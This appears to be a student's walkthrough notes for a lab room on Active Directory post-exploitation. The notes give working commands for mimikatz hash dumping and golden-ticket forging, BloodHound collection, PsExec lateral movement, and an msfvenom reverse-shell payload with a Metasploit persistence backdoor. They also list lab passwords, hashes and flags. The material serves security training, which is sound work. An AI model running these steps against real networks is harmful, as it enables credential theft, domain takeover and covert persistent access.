This room will cover all of the basics of post-exploitation; we'll talk everything from post-exploitation enumeration with powerview and bloodhound, dumping hashes and golden ticket attacks with mimikatz, basic information gathering using windows server tools and logs, and then we will wrap up this room talking about the basics of maintaining access with the persistence metaploit module and creating a backdoor into the machine to get an instant meterpreter shell if the system is ever shutdown or reset.

This room will be related to very real world applications and will most likely not help with any ctfs however this room will give you great starting knowledge of how to approach a network after you have gained a shell on a machine.

----------------------------------------------------------------------------------------------------------------------------

1. PowerView :
	
	Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.

	We'll be focusing on how to start up and get users and groups from PowerView.

Your machine IP is 10.10.231.156

Username: Administrator

Password: P@$$W0rd

Domain Name: CONTROLLER


Lets SSH:

	After SSH :
	Start Powershell < powershell -ep bypass >  -ep bypasses the execution policy of powershell allowing you to easily run scripts
	Start PowerView  < . .\Downloads\PowerView.ps1 >
	Enumerate the domain users  < Get-NetUser | select cn >
	Enumerate the domain groups < Get-NetGroup -GroupName *admin* >
	Shared folder that is not set by default < Invoke-ShareFinder > : Share
	Operating system running inside network < Get-NetComputer -fulldata | select operatingsystem  > :
		operatingsystem
		---------------
		Windows Server 2019 Standard
		Windows 10 Enterprise Evaluation
		Windows 10 Enterprise Evaluation

	Flag inside users:
		Get-User command > POST{P0W3RV13W_FTW}

---------------------------------------------------------------------------------------------------------------------------

2. Enumeration with BloodHound :
	
	On Kali machine:
		Start neo4j : <sudo neo4j console>
	On Windows Machine:
		powershell -ep bypass :  same as with PowerView
		. .\Downloads\SharpHound.ps1
		Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

		This will create a loot.zip file in the current directory with the details of the entire domain controller network.
	On Kali Machine:
		Use scp to copy file :
			scp Administrator@10.10.231.156:./loot.zip loot.zip

		Start bloodhound : bloodhound

		Use username password neo4j:admin (changed form http://localhost:7474 : default neo4j:neo4j)
		Extact loot.zip to loot and import or drag and drop zip file to import.
		Go to Menu > Analysis to see a list of pre-preapred query :
			Select any to execute and see the graph.
	What Service is also domain admin : Find all Domain Admins : SQLSERVICE

	What users are kerberoastable : List all Kerberostable Accounts : SQLSERVICE, KRBTGT 

---------------------------------------------------------------------------------------------------------------------------

3. Dumping Hashes with mimikatz:

	Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network

	We'll be focusing on dumping the NTLM hashes with mimikatz and then cracking those hashes using hashcat

	
	Run Mimikatz :
		controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>cd Downloads && mimikatz

	Check privileges :
		privilege::debug :>  ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly

	Dump the hashes : 
		lsadump::lsa /patch
	
	Copy the details and put the hashes into a separte file 'hash'.
	Crack those hashes with hashcat.

	Crach hash for machine1:
		hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
		64f12cddaa88057e06a81b54e73b949b:Password1

-------------------------------------------------------------------------------------------------------------------------------------

4. Golden Ticket attacks with mimikatz.

	Again using the same tool as the previous task; however, this time we'll be using it to create a golden ticket.

	We will first dump the hash and sid of the krbtgt user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.

	Dump the krbtgt Hash -

﻿	1.) cd downloads && mimikatz.exe    

	2.) privilege::debug ensure this outputs [privilege "20" ok]

	﻿3.) lsadump::lsa /inject /name:krbtgt This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket
		
			Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166                                                        
                                                                                                                     
			RID  : 000001f6 (502)                                                                                                
			User : krbtgt                                                                                                        
                                                                                                                     
			* Primary             
				NTLM : 5508500012cc005cf7082a9a89ebdfdf                                                                          
				LM   :                                                                                                           
			Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf                                                                        
				ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf                                                                        
				lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c  
		We will need the SID S-1-5-21-849420856-2351964222-986696166, User krbtgt and Primary NTLM Hash
		For creating a golden ticket.

	Create a Golden Ticket -

	﻿1.) kerberos::golden /user: /domain: /sid: /krbtgt: /id:
		kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500

	Use the Golden Ticket to access other machine
		misc::cmd - This will open a new command prompt with elevated privileges to all machines

	2.) Access other Machines! - You will now have another command prompt with access to all other machines on the network
		dir \\Desktop-1\c$ :> This will list the C drive of Desktop-1
		
	3.) We can use PsExec.exe for executing commands from other computers:
		PsExec.exe \\Desktop-1 cmd.exe :> This will spawn a command prompt from Desktop-1.

------------------------------------------------------------------------------------------------------------------------

5. Enumerating with server manager:

	Coonect the server with RDP, we can use remmina for that.

	Enumeration w/ Server Manager -

This is what Windows Server Manager will look when you first open it up the main tabs that will be most interesting are the tools and manage tabs the tools tab is where you will find most of your information such as users, groups, trusts, computers. The manage tab will allow you to add roles and features however this will probably get picked up by a systems admin relatively quick.

Dont worry about the AD CS, AD DS, DNS, or File and Storage Services these are setup for exploitation of the active directory and dont have much use for post-exploitation

	Navigate to the tools tab and select the Active Directory Users and Computers
	
	This will pull up a list of all users on the domain as well as some other useful tabs to use such as groups and computers

	Some sys admins dont realize that you as an attacker can see the descriptions of user accounts so they may set the service accounts passwords inside of the description look into the description and find what the SQL Service password is
	
	Event Viewer allows us to view event logs.
	We can see that SQLSERVICE password is MYpassword123#

--------------------------------------------------------------------------------------------------------------------------

6. There are a quite a few ways to maintain access on a machine or network we will be covering a fairly simple way of maintaining access by first setting up a meterpreter shell and then using the persistence metasploit module allowing us to create a backdoor service in the system that will give us an instant meterpreter shell if the machine is ever shutdown or reset.

There are also other ways of maintaining access such as advanced backdoors and rootkits however those are out of scope for this room.

This will require a little more manual setup than the other tasks so it is recommended to have previous knowledge of msfvenom and metasploit.

Generating a Payload w/ msfvenom﻿

1.) msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe this will generate a basic windows meterpreter reverse tcp shell

2.) Transfer the payload from your attacker machine to the target machine.

3.) use exploit/multi/handler - this will create a listener on the port that you set it on.

4.) Configure our payload to be a windows meterpreter shell: set payload windows/meterpreter/reverse_tcp

5.) After setting your THM IP address as your "LHOST", start the listener with run

6.)  Executing the binary on the windows machine will give you a meterpreter shell back on your host - let's return to that

7.) Verify that we've got a meterpreter shell, where we will then background it to run the persistence module.

Run the Persistence Module -

1.) use exploit/windows/local/persistence this module will send a payload every 10 seconds in default however you can set this time to anything you want

2.) set session 1 set the session to the session that we backgrounded in meterpreter (you can use the sessions command in metasploit to list the active sessions)

If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to windows/meterpreter/reverse_tcp allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.



--------------------------------------------------------------------------------------------------------------------------------------

7. Final Thoughts:

This room has given a good beginning with post-exploitation however there are a lot of other methods ever-evolving. I suggest to you to go out and do your own research find your own tools that you like to use for post-exploitation. I hope to make another room similar to this covering more advanced topics such as more in-depth backdoors and trojans, pivoting, token impersonation, and silver ticket attacks. I hope that this room has helped to give you a better understanding of how post-exploitation works in a real-world scenario.

Resources -

    https://blog.harmj0y.net/
    https://adsecurity.org/?page_id=1821
    https://metasploit.help.rapid7.com/docs/about-post-exploitation
    http://www.pentest-standard.org/index.php/Post_Exploitation
    https://offsec.red/mimikatz-cheat-sheet/
    https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

Tools/Malware Used -

    https://github.com/gentilkiwi/mimikatz
    https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
    https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
